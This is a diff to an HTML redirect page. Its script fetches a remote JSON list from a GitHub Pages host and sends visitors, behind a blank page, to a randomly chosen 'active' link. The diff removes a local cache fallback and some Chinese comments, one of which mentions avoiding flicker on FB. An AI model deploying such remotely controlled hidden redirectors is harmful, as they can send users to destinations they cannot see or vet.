@@ -10,33 +10,26 @@
       padding: 0;
       background: #fff;
       overflow: hidden;
-      display: none; /* 防止FB或浏览器闪屏 */
+      display: none;
     }
   </style>
 
   <script>
     (async () => {
       const MAIN_JSON_URL = "https://liuhongliang11895.github.io/888/mapping.json";
-      const LOCAL_KEY = "lastActiveLinks";
-      let activeLinks = [];
 
       try {
-        // ① 拉取主 JSON（强制无缓存）
+        // 强制拉最新 JSON
         const res = await fetch(MAIN_JSON_URL + "?ts=" + Date.now(), { cache: "no-store" });
         if (!res.ok) throw new Error("mapping.json not found");
 
-        // ② JSON 解析
         const data = await res.json();
         if (!data || !Array.isArray(data.links)) throw new Error("Invalid mapping structure");
 
-        // ③ 筛选 active:true
-        activeLinks = data.links.filter(l => l.active);
+        // 只使用最新数据，不使用缓存
+        const activeLinks = data.links.filter(l => l.active);
         if (!activeLinks.length) throw new Error("No active links");
 
-        // ④ 缓存最新可用链接
-        localStorage.setItem(LOCAL_KEY, JSON.stringify(activeLinks));
-
-        // ⑤ 随机跳转
         const idx = Math.floor(Math.random() * activeLinks.length);
         location.replace(activeLinks[idx].url);
         return;
@@ -45,19 +38,11 @@
         console.error("Redirect failed:", e);
       }
 
-      // ⑥ 网络断开 / JSON失败 → 使用缓存兜底
-      const cached = JSON.parse(localStorage.getItem(LOCAL_KEY) || "[]");
-      if (cached.length) {
-        const idx = Math.floor(Math.random() * cached.length);
-        location.replace(cached[idx].url);
-        return;
-      }
-
-      // ⑦ 完全失败 → 显示提示（不会空白页）
+      // 失败时不使用缓存，直接显示空页
       document.body.style.display = "block";
       document.body.innerHTML = `
         <h2 style="font-family: sans-serif; padding: 20px;">
-          System maintenance. Please try again later.
+          Please try again later.
         </h2>
       `;
     })();
@@ -65,3 +50,7 @@
 </head>
 <body></body>
 </html>
+
+
+
+
